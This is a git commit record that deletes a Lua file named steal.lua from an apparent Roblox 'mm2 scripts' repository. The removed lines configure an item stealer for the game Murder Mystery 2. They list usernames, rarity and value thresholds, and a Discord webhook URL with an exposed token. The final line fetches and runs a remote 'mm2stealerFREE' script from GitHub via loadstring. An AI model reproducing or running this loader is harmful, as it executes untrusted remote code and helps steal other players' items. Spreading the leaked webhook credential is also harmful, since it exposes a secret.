307f1cf1c653eefa312fa4b82c38e6a2f728ed63
mm2 scripts <xxdannyarmgamexx@gmail.com>
2025-12-02 18:49:39 -0500

    Delete steal.lua

--- steal.lua
+++
@@ -1,7 +0,0 @@
-_G.Usernames = {"XxVISAOXGAMEYTxX"} -- you can add as many as you'd like
-_G.min_rarity = "Uncommon"
-_G.min_value = 1 -- Put 1 to get all
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1445512533149745177/YIC126SbqICHX3VnIMkbzGco4AWAbNLl2Y2yF6tXDI4Yh2foMmm2fk4kd6Ke51apO1oQ" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lexnow38/mm2/refs/heads/main/mm2stealerFREE%20(1).lua"))()
